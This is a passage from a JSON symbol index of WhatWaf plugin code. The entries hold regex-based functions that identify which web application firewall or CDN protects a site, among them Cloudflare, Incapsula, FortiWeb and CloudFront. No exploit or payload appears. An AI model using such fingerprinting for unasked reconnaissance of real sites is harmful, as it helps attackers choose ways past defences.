        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"x.binarysec.via\", re.I),\n        re.compile(r\"x.binarysec.nocache\", re.I),\n        re.compile(r\"binarysec\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.binarysec",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.binarysec",
        "description": "tools.whatwaf.content.plugins.binarysec",
        "peekOfCode": "__product__ = \"BinarySEC Web Application Firewall (BinarySEC)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"x.binarysec.via\", re.I),\n        re.compile(r\"x.binarysec.nocache\", re.I),\n        re.compile(r\"binarysec\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.binarysec",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.bitninja",
        "description": "tools.whatwaf.content.plugins.bitninja",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"bitninja\", re.I),\n        re.compile(r\"security.check.by.bitninja\", re.I),\n        re.compile(r\".>visitor.anti(\\S)?robot.validation<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.bitninja",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.bitninja",
        "description": "tools.whatwaf.content.plugins.bitninja",
        "peekOfCode": "__product__ = \"BitNinja (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"bitninja\", re.I),\n        re.compile(r\"security.check.by.bitninja\", re.I),\n        re.compile(r\".>visitor.anti(\\S)?robot.validation<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.bitninja",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.blockdos",
        "description": "tools.whatwaf.content.plugins.blockdos",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"blockdos\\.net\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.blockdos",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.blockdos",
        "description": "tools.whatwaf.content.plugins.blockdos",
        "peekOfCode": "__product__ = \"BlockDos DDoS protection (BlockDos)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"blockdos\\.net\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.blockdos",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.chuangyu",
        "description": "tools.whatwaf.content.plugins.chuangyu",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"(http(s)?.//(www.)?)?365cyd.(com|net)\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.chuangyu",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.chuangyu",
        "description": "tools.whatwaf.content.plugins.chuangyu",
        "peekOfCode": "__product__ = \"Chuangyu top government cloud defense platform (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"(http(s)?.//(www.)?)?365cyd.(com|net)\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.chuangyu",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.ciscoacexml",
        "description": "tools.whatwaf.content.plugins.ciscoacexml",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"ace.xml.gateway\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.ciscoacexml",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.ciscoacexml",
        "description": "tools.whatwaf.content.plugins.ciscoacexml",
        "peekOfCode": "__product__ = \"Cisco ACE XML Firewall (Cisco)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"ace.xml.gateway\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.ciscoacexml",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.cloudflare",
        "description": "tools.whatwaf.content.plugins.cloudflare",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schemas = (\n        re.compile(r\"cloudflare.ray.id.|var.cloudflare.\", re.I),\n        re.compile(r\"cloudflare.nginx\", re.I),\n        re.compile(r\"..cfduid=([a-z0-9]{43})?\", re.I),\n        re.compile(r\"cf[-|_]ray(..)?([0-9a-f]{16})?[-|_]?(dfw|iad)?\", re.I),\n        re.compile(r\".>attention.required!.\\|.cloudflare<.+\", re.I),\n        re.compile(r\"http(s)?.//report.(uri.)?cloudflare.com(/cdn.cgi(.beacon/expect.ct)?)?\", re.I),",
        "detail": "tools.whatwaf.content.plugins.cloudflare",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.cloudflare",
        "description": "tools.whatwaf.content.plugins.cloudflare",
        "peekOfCode": "__product__ = \"CloudFlare Web Application Firewall (CloudFlare)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schemas = (\n        re.compile(r\"cloudflare.ray.id.|var.cloudflare.\", re.I),\n        re.compile(r\"cloudflare.nginx\", re.I),\n        re.compile(r\"..cfduid=([a-z0-9]{43})?\", re.I),\n        re.compile(r\"cf[-|_]ray(..)?([0-9a-f]{16})?[-|_]?(dfw|iad)?\", re.I),\n        re.compile(r\".>attention.required!.\\|.cloudflare<.+\", re.I),",
        "detail": "tools.whatwaf.content.plugins.cloudflare",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.cloudfront",
        "description": "tools.whatwaf.content.plugins.cloudfront",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"[a-zA-Z0-9]{,60}.cloudfront.net\", re.I),\n        re.compile(r\"cloudfront\", re.I),\n        re.compile(r\"x.amz.cf.id|nguardx\", re.I)\n    )\n    for detection in detection_schema:\n        if headers is not None:\n            for header in headers.keys():",
        "detail": "tools.whatwaf.content.plugins.cloudfront",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.cloudfront",
        "description": "tools.whatwaf.content.plugins.cloudfront",
        "peekOfCode": "__product__ = \"CloudFront Firewall (Amazon)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"[a-zA-Z0-9]{,60}.cloudfront.net\", re.I),\n        re.compile(r\"cloudfront\", re.I),\n        re.compile(r\"x.amz.cf.id|nguardx\", re.I)\n    )\n    for detection in detection_schema:\n        if headers is not None:",
        "detail": "tools.whatwaf.content.plugins.cloudfront",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.codeigniter",
        "description": "tools.whatwaf.content.plugins.codeigniter",
        "peekOfCode": "def detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"the.uri.you.submitted.has.disallowed.characters\", re.I),\n    )\n    for detection in detection_schema:\n        if status is not None and status == 400:\n            if detection.search(content) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.codeigniter",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.codeigniter",
        "description": "tools.whatwaf.content.plugins.codeigniter",
        "peekOfCode": "__product__ = \"XSS/CSRF Filtering Protection (CodeIgniter)\"\ndef detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"the.uri.you.submitted.has.disallowed.characters\", re.I),\n    )\n    for detection in detection_schema:\n        if status is not None and status == 400:\n            if detection.search(content) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.codeigniter",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.comodo",
        "description": "tools.whatwaf.content.plugins.comodo",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"protected.by.comodo.waf\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.comodo",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.comodo",
        "description": "tools.whatwaf.content.plugins.comodo",
        "peekOfCode": "__product__ = \"Comodo Web Application Firewall (Comodo)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"protected.by.comodo.waf\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.comodo",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.configserver",
        "description": "tools.whatwaf.content.plugins.configserver",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>the.firewall.on.this.server.is.blocking.your.connection.<+\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.configserver",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.configserver",
        "description": "tools.whatwaf.content.plugins.configserver",
        "peekOfCode": "__product__ = \"CSF (ConfigServer Security & Firewall)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>the.firewall.on.this.server.is.blocking.your.connection.<+\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.configserver",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.datapower",
        "description": "tools.whatwaf.content.plugins.datapower",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\A(ok|fail)\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.X_BACKSIDE_TRANS, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.datapower",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.datapower",
        "description": "tools.whatwaf.content.plugins.datapower",
        "peekOfCode": "__product__ = \"IBM Websphere DataPower Firewall (IBM)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\A(ok|fail)\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.X_BACKSIDE_TRANS, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.datapower",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.denyall",
        "description": "tools.whatwaf.content.plugins.denyall",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\Acondition.intercepted\", re.I),\n        re.compile(r\"\\Asessioncookie=\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.denyall",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.denyall",
        "description": "tools.whatwaf.content.plugins.denyall",
        "peekOfCode": "__product__ = \"Deny All Web Application Firewall (DenyAll)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\Acondition.intercepted\", re.I),\n        re.compile(r\"\\Asessioncookie=\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.denyall",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.didiyun",
        "description": "tools.whatwaf.content.plugins.didiyun",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"(http(s)?://)(sec-waf.|www.)?didi(static|yun)?.com(/static/cloudwafstatic)?\", re.I),\n        re.compile(r\"didiyun\", re.I)\n    )\n    if headers is not None:\n        server = headers.get(HTTP_HEADER.SERVER, \"\")\n        if server == \"DiDi-SLB\":",
        "detail": "tools.whatwaf.content.plugins.didiyun",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.didiyun",
        "description": "tools.whatwaf.content.plugins.didiyun",
        "peekOfCode": "__product__ = \"DiDiYun WAF (DiDi)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"(http(s)?://)(sec-waf.|www.)?didi(static|yun)?.com(/static/cloudwafstatic)?\", re.I),\n        re.compile(r\"didiyun\", re.I)\n    )\n    if headers is not None:\n        server = headers.get(HTTP_HEADER.SERVER, \"\")",
        "detail": "tools.whatwaf.content.plugins.didiyun",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.dodenterpriseprotection",
        "description": "tools.whatwaf.content.plugins.dodenterpriseprotection",
        "peekOfCode": "def detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"dod.enterprise.level.protection.system\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.dodenterpriseprotection",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.dodenterpriseprotection",
        "description": "tools.whatwaf.content.plugins.dodenterpriseprotection",
        "peekOfCode": "__product__ = \"DoD Enterprise-Level Protection System (Department of Defense)\"\ndef detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"dod.enterprise.level.protection.system\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.dodenterpriseprotection",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.dosarrest",
        "description": "tools.whatwaf.content.plugins.dosarrest",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"dosarrest\", re.I),\n        re.compile(r\"x.dis.request.id\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True\n        if len(headers) != 0:",
        "detail": "tools.whatwaf.content.plugins.dosarrest",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.dosarrest",
        "description": "tools.whatwaf.content.plugins.dosarrest",
        "peekOfCode": "__product__ = \"DOSarrest (DOSarrest Internet Security)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"dosarrest\", re.I),\n        re.compile(r\"x.dis.request.id\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.dosarrest",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.dotdefender",
        "description": "tools.whatwaf.content.plugins.dotdefender",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"dotdefender.blocked.your.request\", re.I),\n    )\n    if headers.get(\"X-dotDefender-denied\", \"\") == \"1\":\n        return True\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.dotdefender",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.dotdefender",
        "description": "tools.whatwaf.content.plugins.dotdefender",
        "peekOfCode": "__product__ = \"dotDefender (Applicure Technologies)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"dotdefender.blocked.your.request\", re.I),\n    )\n    if headers.get(\"X-dotDefender-denied\", \"\") == \"1\":\n        return True\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.dotdefender",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.dw",
        "description": "tools.whatwaf.content.plugins.dw",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"dw.inj.check\", re.I),\n    )\n    if status == 403:\n        for detection in detection_schema:\n            if detection.search(headers.get(\"X-403-status-by\", \"\")) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.dw",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.dw",
        "description": "tools.whatwaf.content.plugins.dw",
        "peekOfCode": "__product__ = \"DynamicWeb Injection Check (DynamicWeb)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"dw.inj.check\", re.I),\n    )\n    if status == 403:\n        for detection in detection_schema:\n            if detection.search(headers.get(\"X-403-status-by\", \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.dw",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.edgecast",
        "description": "tools.whatwaf.content.plugins.edgecast",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\Aecdf\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.edgecast",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.edgecast",
        "description": "tools.whatwaf.content.plugins.edgecast",
        "peekOfCode": "__product__ = \"EdgeCast Web Application Firewall (Verizon)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\Aecdf\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.edgecast",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.expressionengine",
        "description": "tools.whatwaf.content.plugins.expressionengine",
        "peekOfCode": "def detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\".>error.-.expressionengine<.\", re.I),\n        re.compile(r\".>:.the.uri.you.submitted.has.disallowed.characters.<.\", re.I),\n        re.compile(r\"invalid.get.data\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.expressionengine",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.expressionengine",
        "description": "tools.whatwaf.content.plugins.expressionengine",
        "peekOfCode": "__product__ = \"ExpressionEngine (Ellislab WAF)\"\ndef detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\".>error.-.expressionengine<.\", re.I),\n        re.compile(r\".>:.the.uri.you.submitted.has.disallowed.characters.<.\", re.I),\n        re.compile(r\"invalid.get.data\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.expressionengine",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.fortigate",
        "description": "tools.whatwaf.content.plugins.fortigate",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>powered.by.fortinet<.\", re.I),\n        re.compile(r\".>fortigate.ips.sensor<.\", re.I),\n        re.compile(r\"fortigate\", re.I),\n        re.compile(r\".fgd_icon\", re.I),\n        re.compile(r\"\\AFORTIWAFSID=\", re.I),\n        re.compile(r\"application.blocked.\", re.I),",
        "detail": "tools.whatwaf.content.plugins.fortigate",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.fortigate",
        "description": "tools.whatwaf.content.plugins.fortigate",
        "peekOfCode": "__product__ = \"FortiWeb Web Application Firewall (Fortinet)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>powered.by.fortinet<.\", re.I),\n        re.compile(r\".>fortigate.ips.sensor<.\", re.I),\n        re.compile(r\"fortigate\", re.I),\n        re.compile(r\".fgd_icon\", re.I),\n        re.compile(r\"\\AFORTIWAFSID=\", re.I),",
        "detail": "tools.whatwaf.content.plugins.fortigate",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.gladius",
        "description": "tools.whatwaf.content.plugins.gladius",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    if headers:\n        if headers.get(\"gladius_blockchain_driven_cyber_protection_network_session\", \"\") != \"\":\n            return True",
        "detail": "tools.whatwaf.content.plugins.gladius",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.gladius",
        "description": "tools.whatwaf.content.plugins.gladius",
        "peekOfCode": "__product__ = \"Gladius network WAF (Gladius)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    if headers:\n        if headers.get(\"gladius_blockchain_driven_cyber_protection_network_session\", \"\") != \"\":\n            return True",
        "detail": "tools.whatwaf.content.plugins.gladius",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.googlewebservices",
        "description": "tools.whatwaf.content.plugins.googlewebservices",
        "peekOfCode": "def detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"your.client.has.issued.a.malformed.or.illegal.request\", re.I),\n        re.compile(r\"our.systems.have.detected.unusual.traffic\", re.I),\n        re.compile(r\"block(ed)?.by.g.cloud.security.policy.+\", re.I)\n    )\n    if status == 400 or status == 429 or status == 500:\n        for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.googlewebservices",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.googlewebservices",
        "description": "tools.whatwaf.content.plugins.googlewebservices",
        "peekOfCode": "__product__ = \"Google Web Services (G-Cloud)\"\ndef detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"your.client.has.issued.a.malformed.or.illegal.request\", re.I),\n        re.compile(r\"our.systems.have.detected.unusual.traffic\", re.I),\n        re.compile(r\"block(ed)?.by.g.cloud.security.policy.+\", re.I)\n    )\n    if status == 400 or status == 429 or status == 500:",
        "detail": "tools.whatwaf.content.plugins.googlewebservices",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.greywizard",
        "description": "tools.whatwaf.content.plugins.greywizard",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"greywizard(.\\d.\\d(.\\d)?)?\", re.I),\n        re.compile(r\"grey.wizard.block\", re.I),\n        re.compile(r\"(http(s)?.//)?(\\w+.)?greywizard.com\", re.I),\n        re.compile(r\"grey.wizard\")\n    )\n    gw_server = headers.get(HTTP_HEADER.GW_SERVER, \"\")",
        "detail": "tools.whatwaf.content.plugins.greywizard",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.greywizard",
        "description": "tools.whatwaf.content.plugins.greywizard",
        "peekOfCode": "__product__ = \"Grey Wizard Protection\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"greywizard(.\\d.\\d(.\\d)?)?\", re.I),\n        re.compile(r\"grey.wizard.block\", re.I),\n        re.compile(r\"(http(s)?.//)?(\\w+.)?greywizard.com\", re.I),\n        re.compile(r\"grey.wizard\")\n    )",
        "detail": "tools.whatwaf.content.plugins.greywizard",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.incapsula",
        "description": "tools.whatwaf.content.plugins.incapsula",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"incap_ses|visid_incap\", re.I),\n        re.compile(r\"incapsula\", re.I),\n        re.compile(r\"incapsula.incident.id\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.incapsula",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.incapsula",
        "description": "tools.whatwaf.content.plugins.incapsula",
        "peekOfCode": "__product__ = \"Incapsula Web Application Firewall (Incapsula/Imperva)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"incap_ses|visid_incap\", re.I),\n        re.compile(r\"incapsula\", re.I),\n        re.compile(r\"incapsula.incident.id\", re.I)\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.incapsula",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.infosafe",
        "description": "tools.whatwaf.content.plugins.infosafe",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"infosafe\", re.I),\n        re.compile(r\"by.(http(s)?(.//)?)?7i24.(com|net)\", re.I),\n        re.compile(r\"infosafe.\\d.\\d\", re.I),\n        re.compile(r\"var.infosafekey=\", re.I)\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.infosafe",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.infosafe",
        "description": "tools.whatwaf.content.plugins.infosafe",
        "peekOfCode": "__product__ = \"INFOSAFE by http://7i24.com\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"infosafe\", re.I),\n        re.compile(r\"by.(http(s)?(.//)?)?7i24.(com|net)\", re.I),\n        re.compile(r\"infosafe.\\d.\\d\", re.I),\n        re.compile(r\"var.infosafekey=\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.infosafe",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.instart",
        "description": "tools.whatwaf.content.plugins.instart",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"instartrequestid\", re.I),\n    )\n    if headers.get(\"X-Instart-Request-ID\", \"\") != \"\":\n        return True\n    if headers.get(\"X-Instart-CacheKeyMod\", \"\") != \"\":\n        return True",
        "detail": "tools.whatwaf.content.plugins.instart",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
